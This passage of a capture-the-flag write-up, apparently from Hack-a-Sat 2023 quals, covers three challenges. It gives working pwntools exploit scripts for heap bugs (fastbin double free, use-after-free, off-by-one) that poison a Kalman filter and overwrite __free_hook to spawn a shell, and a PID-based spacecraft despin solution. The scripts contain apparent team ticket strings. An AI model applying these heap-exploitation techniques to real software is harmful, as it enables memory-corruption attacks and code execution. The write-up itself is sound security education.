remove_first_measurement()
# List: NULL <-> A (free)

for i in range(7):
    add_measurement(u64(p8(0x41+i)*8), 0, 0, 0)
# now 0x40 tcache is empty

add_measurement(u64(p8(0x41+i)*8), 0, 0, 0)
# List: NULL <-> A <-> ... (7) ... <-> A

for i in range(7):
    add_measurement(u64(p8(0x41+i)*8), 0, 0, 0)
# List: NULL <-> A <-> ... (7) ... <-> A <-> ... (7)

for i in range(7):
    remove_last_measurement()
# List: NULL <-> A <-> ... (7) ... <-> A, and tcache 0x40 is full

remove_last_measurement()
# NULL <-> A (free) <-> ... (7) ...

for i in range(7):
    remove_last_measurement()
# NULL <-> A (free)

remove_last_measurement()
# double free fastbin A
# NULL <-> NULL

for i in range(7):
    add_measurement(u64(p8(0x41+i)*8), 0, 0, 0)
# drain tcache 0x40

# Allocate A, overwrite its next pointer
target = 0x4141414141414141
add_measurement(target, 0, 0, 0)

# consume tcache so we can consume fastbins
for i in range(7):
    add_measurement(u64(p8(i+1)*8), u64(b"X"*8), 0, u64(b"Z"*8))

# Consume 1 pad chunk from fastbin
add_measurement(0, 0, 0, 0) # pad

# next 0x40 fastbin alloc will end up at 0x4141414141414141

# pwndbg> bins
# ...
# fastbins
# 0x20: 0x0
# 0x30: 0x0
# 0x40: 0x4141414141414141 ('AAAAAAAA')
# 0x50: 0x0
# 0x60: 0x0
# 0x70: 0x0
# 0x80: 0x0
# ...

```

#### Pwning the Kalman Filter

Now that we have control over the forward pointer of the 0x40 fastbin, the next
step is to determine which pointer to place there. As explained earlier, we have
control over the positional readings, but the sensor is not accurate enough, so
we can use the vulnerability to alter the accuracy characteristic of the sensor
to give more weights to our measures.

During the challenge startup, the `User::User()` constructor initializes the `variance_arr` array of doubles for the `PositionUpdate` object associated with the user. This array is the covariance matrix of the position sensor.

This matrix is initialized to

\begin{matrix} 100 & 10 & 10 \\ 10 & 100 & 10 \\ 10 & 10 & 100 \end{matrix}

by the `PositionUpdate::setVariance` method, called inside `User::User()`.

After inserting a breakpoint into `PositionUpdate::setVariance`, we observe that the covariance matrix is stored in the heap and initialized before the simulation and it's never modified after that. With the base address of the heap already leaked, we can calculate the memory address of the covariance matrix and place it in the 0x40 fastbin.

After initializing the covariance matrix, it is possible to inspect the memory using gdb to obtain the layout of the chunk where it is stored.

```
heap_base + 0x11e90: 0x0000000000000000      0x0000000000000000
heap_base + 0x11ea0: 0x0000000000000000      0x0000000000000041
heap_base + 0x11eb0: 0x4059000000000000      0x4059000000000000
heap_base + 0x11ec0: 0x4059000000000000      0x4024000000000000
heap_base + 0x11ed0: 0x4024000000000000      0x4024000000000000
heap_base + 0x11ee0: 0x0000000000000000      0x00000000000001e1
```

This chunk contains the double precision floating point representation of 100 (0x4059000000000000) and 10 (0x4024000000000000).

Using the fastbin attack that was previously employed, it is possible to modify the values in the covariance matrix. This allows to give measures with the accuracy that we choose, enabling us to heavily affect the simulation. To carry out the fastbin attack successfully, we need to place the address of something that resembles a 0x40 sized chunk in the 0x40 fastbin. Since the chunk storing the covariance matrix has a size of 0x40, it can be placed in the 0x40 fastbin. Specifically, we insert the address `heap_base + 0x11e90` into the 0x40 fastbin.

Being the covariance matrix:

\begin{matrix} a_{0,0} & a_{0,1} & a_{0,2} \\ a_{1,0} & a_{1,1} & a_{1,2} \\ a_{2,0} & a_{2,1} & a_{2,2} \end{matrix}

by allocating two additional position measurements, it is possible to place arbitrary values in $a_{0,0}$ and $a_{a_{1,1}}$, while storing the forward and backward pointers of the 0x40 fastbin in $a_{0,1}$, $a_{1,0}$, and $a_{2,2}$. When interpreted using floating point representation, these values are close to zero.

We put in $a_{0,0}, a_{0,1}$ the value 0, with a resulting covariance matrix of

$\begin{matrix} 0 & 4.65326\mathrm{e}{-310} &  10 \\ 4.65326\mathrm{e}{-310} & 0 & 10 \\ 10 & 10 & 4.65326\mathrm{e}{-310} \end{matrix}$

The zeros along the diagonal for the x and y coordinates and the extremely small value for the z coordinate, make the sensor behave almost as ground truth, moving the estimate for the position almost exactly to where we put the reading.

#### Poisoning measurements to make the satellite closer to the space station

In the final step of the exploitation, the position values stored in memory are modified to bring the satellite closer to the space station.

The `User::run(User *this)` function is responsible for running the simulation. By examining the function, it becomes clear that the simulation processes each acceleration measurement provided in the `accels.bin` file. The file contains a set of accelerations from timestamp 0 to timestamp 100.9 seconds, with each acceleration separated by an interval of 0.1 seconds.

The simulation algorithm only processes a position measurement if it precedes the currently processed acceleration. Otherwise, the algorithm only propagates using the state and accelerations.

However, it is important to note that the simulation algorithm considers the positions stored in the `LinkedList` of measurements in ascending order of timestamp.
```c
// Get the head element of LinkedList
Front = LinkedList<PositionMeasurement>::getFront(&this->positions_linked_list, 0LL);
// ...
// Simulation code
// ...
if (CurrentAcceleration.Time <= Front.Time) {
    // ...
    // Propagate the current result
    // ...
}
else {
    // ...
    // Use the position to update the simulation state
    // ...
    LinkedList<PositionMeasurement>::popFront(&this->positions_linked_list);
    if ( LinkedList<PositionMeasurement>::getFront(&this->positions_linked_list, 0LL) )
        Front = LinkedList<PositionMeasurement>::getFront(&this->positions_linked_list, 0LL);
}
```

The pseudocode indicates that the `LinkedList` of positions is only iterated
when the current acceleration has a lower timestamp than the current position.
By adding a series of positional readings with a timestamp close to the end of
the simulation at the head of the LinkedList, the simulation will proceed using
only the acceleration up to that point. Then, thanks to the extremely small
covariance matrix, the positional readings can deceive the Kalman filter placing
the estimate to where we need it, with high reported accuracy.

Thankfully, we have control over the head of the LinkedList while draining the
tcache 0x40. We simply need to drain the tcache by inserting measurements with a
timestamp close to the final acceleration, which occurs at 100000999
microseconds. The resulting measurement list will appear like this:

```
Raw Measurement 0: 100000999 0 0 0
Raw Measurement 1: 100000999 0 0 0
Raw Measurement 2: 100000999 0 0 0
Raw Measurement 3: 100000999 0 0 0
Raw Measurement 4: 100000999 0 0 0
Raw Measurement 5: 100000999 0 0 0
Raw Measurement 6: 100000999 0 0 0
Raw Measurement 7: 3735928559 3648368.206055 3468143.733398 3468144.206055
Raw Measurement 8: 0 0.063477 0.000000 0.000000
Raw Measurement 9: 0 0.063477 0.000000 0.000000
```

Running the simulation with these position values, we obtain a final covariance matrix of
\begin{matrix} 2.40386 && 0.0149185 && 1.46353 \\ 0.0149185 && 2.40386 && 1.46353 \\ 1.46353 && 1.46353 &&  2.41878 \end{matrix}


and a final estimated position of $-38.138080,-27.710931,-1.540729$.

To ensure that the final position satisfies the 10-meter constraint from the
space station, it is necessary to drain the tcache with the following position
measurement: $100000999, 33.203125, 21.484375, 2.929688$.

This did the trick, giving us a final position estimate of
$-4.933969,-6.225570,1.020739$ and the same final covariance matrix, at the end
of the simulation.

So, we got the flag!

### Exploit script

```python
#!/usr/bin/env python3
from pwn import *
#import ipdb

# exe = ELF("./Kalman_patched")
# libc = ELF("./libc-2.31.so")

# context.binary = exe
# context.log_level = 'warning'

def conn():
    if args.GDB:
        r = remote('localhost', 2007)
        input('wait for gdb to attach')
    elif args.REMOTE:
        r = remote("kalman.quals2023-kah5Aiv9.satellitesabove.me", 5300)
        r.sendlineafter(b"please:\n", b"ticket{yankee725474mike4:GPYXYVILP60gKGJ1cc_gpGhXmFSaJh9uwelxoeiMoPAPH84JrU4Sp4EsjVnd_U9xVg}")
    return r

def add_measurement(time, x, y, z):
    r.sendline(b"1")
    r.recvuntil(b"Time (US)>\n")
    r.sendline(b"%ld" % time)
    r.recvuntil(b"X>\n")
    r.sendline(b"%ld" % x)
    r.recvuntil(b"Y>\n")
    r.sendline(b"%ld" % y)
    r.recvuntil(b"Z>\n")
    r.sendline(b"%ld" % z)
    r.recvuntil(b"Choice>\n")


def add_measurement_raw(time, x, y, z):
    r.sendline(b"1")
    r.recvuntil(b"Time (US)>\n")
    r.sendline(time)
    r.recvuntil(b"X>\n")
    r.sendline(x)
    r.recvuntil(b"Y>\n")
    r.sendline(y)
    r.recvuntil(b"Z>\n")
    r.sendline(z)
    r.recvuntil(b"Choice>\n")

def remove_first_measurement():
    r.sendline(b"2")
    r.recvuntil(b"Choice>\n")

def remove_last_measurement():
    r.sendline(b"3")
    r.recvuntil(b"Choice>\n")

def list_measurements():
    measurements = []
    r.sendline(b"4")
    data = r.recvuntil(b"Choice>\n")
    for l in data.split(b"\n"):
        if not b"Raw Measurement" in l:
            continue
        print(l)
        data = l.split(b":")[1].strip().split(b" ")
        print(data)
        measurements.append([int(data[0])] + [float(x) for x in data[1:]])
    return measurements


def poison_covariance_matrix(heap_start):
    # first add will overewrite the UAFd head, so we are good
    add_measurement(0x4141414141414141, 0, 0, 0)
    # A <-> A (6 elements in 0x40 tcache)

    for i in range(8):
        add_measurement(u64(p8(0x41+i)*8), 0, 0, 0)
    for _ in range(8):
        remove_last_measurement()
    # A <-> A (0x40 tcache full)

    remove_first_measurement()
    # NULL <-> A (free)

    for i in range(7):
        add_measurement(u64(p8(0x41+i)*8), 0, 0, 0)
    # now tcache is empty
    add_measurement(u64(p8(0x41+i)*8), 0, 0, 0)
    # NULL <-> A <-> ... (7) ... <-> A

    for i in range(7):
        add_measurement(u64(p8(0x41+i)*8), 0, 0, 0)
    # NULL <-> A <-> ... (7) ... <-> A <-> ... (7)

    for i in range(7):
        remove_last_measurement()
    # (tcache 0x40 full)
    # NULL <-> A <-> ... (7) ... <-> A

    remove_last_measurement()
    # NULL <-> A (free) <-> ... (7) ... ?

    for i in range(7):
        remove_last_measurement()
    # NULL <-> A (free) ?

    remove_last_measurement()
    # double free fastbin A ?
    # NULL <-> NULL

    for i in range(7):
        add_measurement(100000999, 34000,22000, 3000)
    # drain tcache 0x40

    # Arbitrary write with fastbin attack
    add_measurement(heap_start + 0x11e90, 0, 0, 0)
    # first fastbin (A)

    for i in range(7):
        add_measurement(90, u64(b"Z"*8), u64(b"X"*8), 0)
    # take 7 tcache

    add_measurement(0xdeadbeef, 0xdeadc0d3, 0xd3adbeef, 0xd3adc0d3) # place tcache inside an unsorted

    add_measurement(u64(struct.pack('<d', 0.0)), 0x41, u64(struct.pack('<d', 0.0)), u64(struct.pack('<d', 0.0)))
    add_measurement(u64(struct.pack('<d', 0.0)), 0x41, u64(struct.pack('<d', 0.0)), u64(struct.pack('<d', 0.0))) # alloc


def main():
    global r
    r = conn()

    r.recvuntil(b"Choice>\n")

    # heap leak
    for _ in range(11):
        remove_last_measurement()

    heap_leak = list_measurements()[0][0]


    heap_init_offset = 0x14b40
    heap_start = heap_leak - heap_init_offset
    log.warning("heap base : 0x%x", heap_start)
    poison_covariance_matrix(heap_start)
    # Run simulation
    r.sendline(b"5")

    r.interactive()

if __name__ == "__main__":
    main()
```

Magic Space Bussin
------

### The challenge
**Category**: "Pure Pwnage"

#### Description

The challenge is a C++ application for which we are given both the compiled binary (called `magic`) and the source code. It can be run using the provided challenge files, which include a couple of `Dockerfile` files and a top level `Makefile`:

Building a local copy:

```bash
$ make static
```

Running the challenge:

```bash
$ make build     # Build Docker containers
$ make challenge # Run challenge locally through socat + Docker
```

When the `magic` binary is started we are greeted with a menu:

```
startracker 1 pipe_id: 0
startracker 2 pipe_id: 1
1: Post message on bus
2: Handle startracker 1 messages
3: Handle startracker 2 messages
4: Exit
>
```

Option `1` allows us to send messages on a pipe:

```
startracker 1 pipe_id: 0
startracker 2 pipe_id: 1
1: Post message on bus
2: Handle startracker 1 messages
3: Handle startracker 2 messages
4: Exit
> 1

msg_id: 100
pipe_id: 0
hex: 0
Message to post on bus: AAAAAAAA
Clearing msg (0 : 100)
```

When sending messages we are asked for 4 parameters:

- `msg_id`: Identifies the function that will get executed when the message is read from the pipe, the only valid value is `100`
- `pipe_id`: Identifies the pipe on which the message will be sent, valid values are `0`, `1` and `255` (broadcast)
- `hex`: A boolean value that indicated whether the message content is hex-encoded or not
- `Message to post on bus`: The message content

Option `2` and `3` allow us to pop messages that were sent respectively in pipe `0` and `1`.

The only valid `msg_id` is 100, and when such a message is received on a pipe the program simply prints the hex-encoded message byte by byte. For example:

```
startracker 1 pipe_id: 0
startracker 2 pipe_id: 1
1: Post message on bus
2: Handle startracker 1 messages
3: Handle startracker 2 messages
4: Exit
> 1

msg_id: 100
pipe_id: 0
hex: 0
Message to post on bus: AAAAAAAA
Clearing msg (0 : 100)
1: Post message on bus
2: Handle startracker 1 messages
3: Handle startracker 2 messages
4: Exit
> 2

StarTracker: Testing Message
0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
Clearing msg (0 : 100)
```

### Solution

There are two vulnerabilities in the challenge, the first one is a use-after-free (UAF) plus a double free, and the second one is an off-by-one out-of-bounds write.

#### UAF + double free

Each pipe has a maximum message capacity of `10`, which means that after `10` messages you will no longer be able to send messages on that pipe unless you pop some of them by using option `2` or `3`.

When sending a message to `pipe_id = 255` the message is broadcasted to both pipe `0` and `1`.
The UAF occurs when we broadcast a message with the pipe `0` full.
After failing to send the message to pipe `0` (at `[5]` with `i = 0`) the program frees the pointer containing the message data and then keeps broadcasting the freed message to pipe `1`.  Which means that when the message is sent to pipe 1 (at `[4]` with `i = 1`) the pipe will store a freed pointer.

```c
// pipe_id 255 -> broadcast
if (payload->pipe_id == UINT8_MAX) {

    // [1]
    // bail out if too many pipes are subscribed to a msg_id
    if (this->msg_id_pipe_lens[payload->msg_id] <= this->msg_max_subs) {
        bool copy = true;

        // [2]
        // for each pipe subscribed to this msg_id
        // (pipe 0 and 1 are subscribed to the only available msg_id -> 100)
        for (i = 0; i < this->msg_id_pipe_lens[payload->msg_id]; i++){
            cur_pipe_num = this->msg_id_pipe_map[payload->msg_id][i];

            // [3]
            // the last pipe stores the pointer used to read the message content
            // other pipes always receive a new copy of that buffer
            if (i == (this->msg_id_pipe_lens[payload->msg_id]-1)){
                copy = false;
            }

            pipe = GetPipeByNum(cur_pipe_num);

            // [4]
            // if copy is false then the pipe will store
            // payload->data without copying it
            if (pipe->SendMsgToPipe(payload, copy) != SB_SUCCESS) {
                LOG_ERR("Unable to send payload to Pipe Num: %d\n", cur_pipe_num);

                // [5]
                // when sending a message on a full pipe `SendMsgToPipe` will fail
                // and payload->data will be freed
                delete payload->data;
                ret = SB_FAIL;
            }
        }
        if (i == 0) {
            LOG_ERR("No pipes subscribed to Msg ID: %d\n", payload->msg_id);
            delete payload->data;
            ret = SB_FAIL;
        }
        payload->data = nullptr;
    } else {
        LOG_ERR("Too many pipes subscribed to Msg ID: %d. Bailing out...\n", payload->msg_id);
        exit(-1);
    }
}
```

When receiving a message from a pipe the data pointer is freed, which means that if, after triggering this UAF, we receive the first message from the pipe `1`, we will trigger a double free.

#### Off-by-one

The off-by-one write occurs when sending an hex-encoded message with an odd length:

```c
size_t SB_Pipe::CalcPayloadLen(bool ishex, const std::string& s) {
    if (ishex && (s.length() % 2 == 0)) {
        return s.length() / 2;
    } else {
        return s.length();
    }
}

uint8_t* SB_Pipe::AllocatePlBuff(bool ishex, const std::string& s) {
    if (ishex) {
        return new uint8_t[s.length() / 2];
    } else {
        return new uint8_t[s.length()];
    }
}

// invoked when sending a message on a pipe
SB_Msg* SB_Pipe::ParsePayload(const std::string& s, bool ishex, uint8_t pipe_id, uint8_t msg_id){
    if (s.length() == 0) {
        return nullptr;
    }

    // allocate a buf on the heap of sz = s.length() / 2
    uint8_t* msg_s = AllocatePlBuff(ishex, s);

    // if user sent `hex: 1`
    if (ishex) {
        char cur_byte[3] = {0};

        // if s.lenth() is odd `CalcPayloadLen()` returns s.length()
        // instead of s.length() / 2
        for (size_t i = 0, j = 0; i < CalcPayloadLen(ishex, s); i+=2, j++) {
            cur_byte[0] = s[i];
            cur_byte[1] = s[i+1];
            msg_s[j] = static_cast<uint8_t>(std::strtol(cur_byte, nullptr, 16));
        }
    } else {
        for(size_t i = 0; i < CalcPayloadLen(ishex, s); i++){
            msg_s[i] = static_cast<uint8_t>(s[i]);
        }
    }

    // ...
}
```

We can only control the lower nibble of byte written oob, the higher nibble is always set to `0` because `strtoul()` only sees a 1-character string.

#### Exploitation

In short, we used the UAF to get a libc leak from a freed unsorted bin, and the double free in combination with the off-by-one oob write to get arbitrary write and overwrite `__free_hook` with a [one gadget](https://github.com/david942j/one_gadget) that calls `execve("/bin/sh", 0, 0)`. The complete exploit script is provided below and explains the relevant exploitation steps in more detail through comments in the `main()` function.

```py
#!/usr/bin/env python3

import re
from pwn import *

exe = ELF('./magic_patched', checksec=False)
libc = ELF('./libc_debug-2.31.so', checksec=False)
context.binary = exe

TICKET = b'ticket{quebec703978whiskey4:GEmu1G0NX1z6syFsVFKuX0vLGEw0ULBraF16mEtKzS4qEdVXUd8NgwhCMM9Y4bpAjg}'

def conn():
    if args.GDB:
        r = gdb.debug([exe.path])
    elif args.REMOTE:
        r = remote('magic.quals2023-kah5Aiv9.satellitesabove.me', 5300)
        r.sendlineafter(b'Ticket please:\n', TICKET)
    else:
        r = process([exe.path])
    return r

def post_msg(msg_id, pipe_id, ishex, msg, pwn=False):
    r.sendline(b'1')
    r.recvuntil(b'msg_id: ')
    r.sendline(b'%d' % msg_id)
    r.recvuntil(b'pipe_id: ')
    r.sendline(b'%d' % pipe_id)
    r.recvuntil(b'hex: ')
    r.sendline(ishex)
    r.recvuntil(b'Message to post on bus: ')
    r.sendline(msg)

    if pwn:
        return

    data = r.recvuntil(b'\n> ')

    m = re.match(b'(.)*Clearing msg \((\d+) : (\d+)\)', data, re.DOTALL)
    if m:
        if m.group(1):
            log.warning(m.group(0).decode())

        return (int(m.group(2)), int(m.group(3)))


def handle(startracker_id):
    if startracker_id != 1 and startracker_id != 2:
        log.error('Invalid startracker_id: %d' % startracker_id)
        return
    if startracker_id == 1:
        r.sendline(b'2')
    elif startracker_id == 2:
        r.sendline(b'3')

    STOP = b'\n1: Post message on bus'
    data = r.recvuntil(STOP)
    data = data[:-len(STOP)]

    if b'Testing Message\n' in data:
        return bytearray(map(lambda x: int(x, 16), re.findall(rb'0x(..)', data)))

    r.recvuntil(b'> ')
    return data


def alloc(pipe_id, data, pwn=False):
    post_msg(100, pipe_id, b'0', data, pwn)


def alloc_hex(pipe_id, data):
    post_msg(100, pipe_id, b'1', data)


def broadcast(data):
    post_msg(100, 0xff, b'0', data)


def free(pipe_id):
    return handle(pipe_id + 1)


def main():
    global r
    r = conn()

    r.recvuntil(b'\n> ')

    # Fill pipe 0
    for _ in range(10):
        alloc(0, b'-')

    # Allocate a chunk of sz 0x140 (target chunk)
    # this will get stored freed in the pipe 1
    # At offset 0xf0 we create a fake next_chunk, so that when we overwrite the last byte
    # of the sz = 0x140 to sz = 0x100 we will have a valid prev_inuse bit
    broadcast(flat({
        0xf0: [p64(0), p64(0x41)]
    }, filler = b'B', length = 0x130))

    # Empty pipe 0
    for _ in range(10):
        free(0)

    # Allocate a chunk before the target chunk and use the off-by-one
    # to poison the size
    alloc_hex(0, (b'A' * 0x1e8).hex().encode() + b'1')

    # Free target chunk again to put it in another tcache
    # Now that the size is changed we can free it again
    # and we will not cause a double-free abort as the target tcache bin is different
    free(1)

    # Empty pipe 0
    free(0)

    # Fill pipe 0 with all small and last big
    # This big chunk will end up in unsorted bin when freed
    alloc(0, b'F' * 0x1000)

    for _ in range(9):
        alloc(0, b'.' * 0x10)

    # Add padding after the chunk that will end in unsorted
    alloc(1, b'.' * 0x30)

    # Put chunk in unsorted, now pipe 0 has 9/10 messages
    free(0)

    # Fill pipe 0
    alloc(0, b'.' * 0x10)

    # Broadcast, this will reclaim the unsorted, free it and put it in pipe 1
    broadcast(b'@' * 0xf00)

    # Alloc a small portion from the unsorted bin
    # so that when the freed message in pipe 1 is received
    # we will free this message without crashing and also
    # leaking the pointers from the unsorted right after this chunk
    alloc(1, b'W' * 0x50)

    # Remove padding chunk from pipe 1
    free(1)

    # Leak libc from unsorted
    # This is when the 0x50 sized buffer is freed to prevent double freeing the unsorted
    libc_leak = u64(free(1)[107:107+6] + b"\x00\x00")
    libc.address = libc_leak - libc.sym.main_arena - 96

    log.warning("libc leak : 0x%x", libc_leak)
    log.warning("libc base : 0x%x", libc.address)

    # Empty pipe 0
    for _ in range(10): free(0)

    # Use the double freed tcache entry to get arb write
    # and overwrite __free_hook with a one_gadget
    alloc(0, p64(libc.sym.__free_hook - 0x8) + b"X"*0x128)
    alloc(0, b"A"*8 + p64(libc.address + 0xe3b01) + b"B"*0xe0, pwn=True)

    r.interactive()

if __name__ == '__main__':
    main()
```

You've Been Promoted
------
### The challenge

**Category**: "Anomaly Review Bored"

#### Description

This challenge consists of a remote TCP service for which we are not given any source or binary. When connecting to the given address (e.g., through Netcat), we are greeted with the following information:

```shell
$ nc management.quals2023-kah5Aiv9.satellitesabove.me 5300
Send me commands to get the spacecraft under control and the spacecraft despun
You must run for 3600 seconds
Make sure the magnitude of the spacecraft angular velocity vector is less than 0.001 (rad/s)
Make sure each reaction wheel has a spin rate that is between -20 and 20 (rad/s)

Reaction wheels accept torque commands in N-m
Reaction wheel commands are valid between [-0.2, 0.2] N-m
Available reaction wheels:
- Wheel_X: aligned with body X axis
- Wheel_Y: aligned with body Y axis
- Wheel_Z: aligned with body Z axis

Magnetic Torquer Bars (MTB) accept commands in magnetic dipole (A-m^2)
MTB dipole commands are valid between [-1000.0, 1000.0] (A-m^2)
Available MTB
- MTB_X: aligned with body X axis
- MTB_Y: aligned with body Y axis
- MTB_Z: aligned with body Z axis

Actuator commands are formatted as:
Wheel_X, Wheel_Y, Wheel_Z, MTB_X, MTB_Y, MTB_Z

Sensor:Time (sec), AngV_X (rad/s), AngV_Y (rad/s)), AngV_Z(rad/s), WheelX(rad/s), WheelY(rad/s), WheelZ(rad/s), magX (T), magY(T), magZ(T)
0.0,0.1,0.1,-0.2,314.1592653589793,-471.23889803846896,282.7433388230814,-3.210377245457677e-05,-1.1355247439189624e-05,-2.263494595823975e-05
Enter actuator command: nan,nan,nan,nan,nan,nan
Array item nan is not finite.
Expected format of array input is 'X1,X2,X3,....,XN'
```

The remote server is asking us to help controlling a spinning spacecraft through three-axis stabilization. The spacecraft is in fact equipped with 3 reaction wheels (RW) and 3 magnetic torque bars (MTB), each mounted on a different axis.

Each second of time we receive sensor readings for the current angular speed of the spacecraft on each axis (in rad/s), the current angular speed of each RW in (rad/s), and the current magnetic field strenght (in Tesla) measured by the spacecraft on each axis.

To perform three-axis stabilization, each second of time we can apply a chosen torque (between -0.2Nm and +0.2Nm) to each RW and a chosen magnetic dipole (between -1000Am<sup>2</sup> and +1000Am<sup>2</sup>) to each MTB. We have 3600 seconds to get the spacecraft's angular velocity within -0.001 and 0.001 rad/s on all 3 axes and the angular velocity of all reaction wheels within -20 and +20 rad/s. If, at the end of the 3600th second, all requested values are found within range, the spacecraft will be considered stabilized.

### Solution

The system that is being emulated by the server seems to be a standard three-axis stabilization problem:

- Torque can be applied to reaction wheels to make them accelerate and spin either clockwise or counterclockwise to contrast the spacecraft spin on each axis.
- Magnetic torque bars can be powered with a positive or negative current to provide the whole spacecraft with positive or negative torque perpendicular to the magnetic field.

To reach our goal, we can control the spin of the spacecraft itself through the RWs, and the spin of the RWs through the MTBs.

We implemented our solution using the [`simple-pid`](https://pypi.org/project/simple-pid/) Python package to model 6 PID controllers (one for each RW and MTB) as follows:

- 3 PIDs (one per axis) each taking the negated angular velocity of the spacecraft on the corresponding axis as input. The produced response, limited between -0.2 and +0.2, is then provided as the torque to apply to the RWs (one per axis).
- 3 PIDs (one per axis) each taking one negated component (on the corresponding axis) of the cross product *W⨯B*, where *W* is the vector *(WheelX, WheelY, WheelZ) [rad/s]*, and *B* is the magnetic field vector *(magX, magY, magZ) [T]*. The produced response, limited between -1000 and +1000, is then provided as the elecric dipole to apply to the MTBs (one per axis).

Theoretically speaking, determining the right magnetic dipole to control the MTBs is not simple, because we ideally want them to produce a torque that counters the spin of the RWs, but the only torque the MTBs can generate is perpendicular to the magnetic field felt by the spaceship at any given time. The equation to calculate the applied torque given a magnetic dipole (*M*) is *T = M⨯B*. It is however not possible to simply invert the equation and find *M* given *T* and *B*, as the matrix used for the cross-product (*[(0,Bz,-By), (-Bz,0,Bx), (By,-Bx,0)]*) is non-invertible.

Knowing the above, although seemingly nonsensical at first glance (even just dimensionally speaking), the intuitive reasoning we followed to come up with *W⨯B* was as follows:

1. The torque we want to apply on each axis needs to be opposite in sign and directly proportional in modulus to the angular velocity of the RWs.
2. The torque we can apply is perpendicular to both the magnetic field and the applied magnetic dipole (*T = M⨯B*).
3. Therefore the magnetic dipole vector to apply needs to be proportional in modulus and opposite in direction to *W⨯B*.

After figuring out the above, the rest was a matter of trial and error and manual tuning. Running multiple simulations, we ended up with the following PID parameters:

- *(Kp, Ki, Kd) = (5, 0.5, 0.1)* for the 3 RW PIDs
- *(Kp, Ki, Kd) = (10<sup>5</sup>, 10<sup>4</sup>, 5•10<sup>4</sup>)* for the 2 MTB PIDs for the x-axis and z-axis
- *(Kp, Ki, Kd) = (3•10<sup>5</sup>, 10<sup>5</sup>, 10<sup>5</sup>)*  for the MTB PID for the y-axis.

While doing this, we also noticed that stabilizing both the spacecraft's angular velocity and the RWs' angular velocity was harder than expected, because PID responses were in turn altering other PIDs inputs. In other words, reducing the angular velocity of the spaceship along one axis means increasing the angular velocity of the RW for that axis, and reducing the angular velocity of a RW for one axis through MTBs could mean altering the angular velocity of the spacecraft on any axis.

In order to get over this issue, we manually defined some time windows within which we would generate a response for the torque to apply to the RWs. Outside these time windows, the response would just be `0` on all axes. We ended up applying torque to RWs only between t=500s and t=999s seconds, and then from t=2500s onwards.

### Solution script

```python
#!/usr/bin/env python3
#
# @mebeim - 2023-04-02
#

from pwn import *
from simple_pid import PID
import numpy as np

TIME = 0

def faketime():
	global TIME
	return TIME

pwx = PID(5, .5, .1, setpoint=0, sample_time=1, output_limits=(-0.2, 0.2))
pwy = PID(5, .5, .1, setpoint=0, sample_time=1, output_limits=(-0.2, 0.2))
pwz = PID(5, .5, .1, setpoint=0, sample_time=1, output_limits=(-0.2, 0.2))

pwx.time_fn = faketime
pwy.time_fn = faketime
pwz.time_fn = faketime

pmx = PID(1e5, 1e4, 5e4, setpoint=0, sample_time=1, output_limits=(-1000, 1000))
pmy = PID(3e4, 1e5, 1e5, setpoint=0, sample_time=1, output_limits=(-1000, 1000))
pmz = PID(1e5, 1e4, 5e4, setpoint=0, sample_time=1, output_limits=(-1000, 1000))

pmx.time_fn = faketime
pmy.time_fn = faketime
pmz.time_fn = faketime

def read_sensors(r):
	r.recvuntil(b'Sensor:')
	r.recvline()
	return tuple(map(float, r.recvline().decode().split(',')))

VSLOTS = [range(500, 1000), range(2500, 9999)]
WSLOTS = [range(0, 9999)]

def react(t, vx, vy, vz, wx, wy, wz, bx, by, bz):
	global TIME
	t = int(t)
	TIME = t

	adjv = any(t in rng for rng in VSLOTS)
	adjw = any(t in rng for rng in WSLOTS)

	if adjv:
		rwx = pwx(-vx, dt=1)
		rwy = pwy(-vy, dt=1)
		rwz = pwz(-vz, dt=1)
	else:
		rwx = rwy = rwz = 0

	if adjw:
		b = np.array([bx, by, bz], dtype='float64')
		w = np.array([wx, wy, wz], dtype='float64')
		rmx, rmy, rmz = np.cross(w, b)

		rmx = pmx(-rmx, dt=1)
		rmy = pmy(-rmy, dt=1)
		rmz = pmz(-rmz, dt=1)
	else:
		rmx = rmy = rmz = 0

	return rwx, rwy, rwz, rmx, rmy, rmz


r = remote('management.quals2023-kah5Aiv9.satellitesabove.me', 5300)
r.sendlineafter(b'please:\n', b'ticket{golf324482oscar4:GKUkXwTflQTacpeZCTn70CIbqdHDTYJ-pN58Nvss2iwjqrR1rYUPjuuaYtF7MP8UTA}')

for t in range(3601):
	data = read_sensors(r)
	t, *v = data[:4]
	w = data[4:4+3]
	m = data[4+3:4+3+3]

	vmag = (v[0]**2 + v[1]**2 + v[2]**2)**0.5

	resp = react(*data)
	rw = resp[:3]
	rmag = resp[3:]

	log.info('<- Sensors : t=%4.0f, |v|=%10.04f, v=(%10.04f, %10.04f, %10.04f),   w=(%10.04f, %10.04f, %10.04f), m=(%10.2e, %10.2e, %10.2e)', t, vmag, *v, *w, *m)
	log.info('-> Response:                         w=(%10.04f, %10.04f, %10.04f), mag=(%10.04f, %10.04f, %10.04f)', *rw, *rmag)

	r.sendline(', '.join(map('{:.30f}'.format, resp)).encode())

r.interactive()
```